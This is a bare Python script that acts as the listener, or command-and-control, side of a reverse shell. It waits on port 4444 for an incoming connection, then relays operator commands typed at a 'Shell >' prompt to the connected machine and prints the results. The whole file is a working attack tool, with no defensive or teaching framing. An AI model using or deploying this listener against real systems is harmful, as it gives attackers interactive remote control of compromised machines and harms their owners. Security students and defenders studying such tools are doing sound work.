
import socket

def start_server(host='0.0.0.0', port=4444):
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((host, port))
    server_socket.listen(1)
    print(f'[+] Listening for incoming connections on {host}:{port}...')

    conn, addr = server_socket.accept()
    print(f'[+] Connection established from {addr[0]}:{addr[1]}')

    while True:
        command = input('Shell > ')
        if command.lower() in ['exit', 'quit']:
            conn.send(command.encode())
            break

        conn.send(command.encode())
        result = conn.recv(4096).decode()
        print(result)

    conn.close()
    server_socket.close()

if __name__ == '__main__':
    start_server()
